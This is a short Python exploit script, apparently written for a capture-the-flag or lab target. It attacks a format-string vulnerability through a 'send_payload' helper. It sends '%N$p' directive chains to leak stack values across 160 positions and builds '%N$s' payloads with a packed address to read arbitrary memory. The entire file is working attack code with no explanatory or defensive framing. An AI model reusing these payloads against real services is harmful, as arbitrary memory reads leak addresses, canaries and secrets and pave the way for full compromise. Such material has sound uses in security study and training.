import struct, re
from mirage import send_payload

def scan_px(lo, hi):
    fmt = "".join("%%%d$p." % i for i in range(lo, hi+1))
    b, r = send_payload(fmt.encode() + b"\n", wait=2)
    parts = r.split(b".")
    vals = []
    for p in parts:
        p = p.strip()
        if p.startswith(b"0x"):
            try:
                vals.append(int(p, 16))
            except ValueError:
                vals.append(None)
        elif p == b"(nil)":
            vals.append(0)
        else:
            vals.append(None)
    return vals

def deref(addr, slot=7):
    a = struct.pack("<Q", addr)
    directive = ("%%%d$s" % slot).encode()
    pad = b"A" * (8 - len(directive))
    payload = directive + pad + a + b"\n"
    b, r = send_payload(payload, wait=2)
    return r

all_vals = {}
for lo in range(1, 160, 20):
    hi = min(lo+19, 160)
    vals = scan_px(lo, hi)
    for idx, v in zip(range(lo, hi+1), vals):
        all_vals[idx] = v

for idx, v in sorted(all_vals.items()):
    print(idx, hex(v) if v else v)
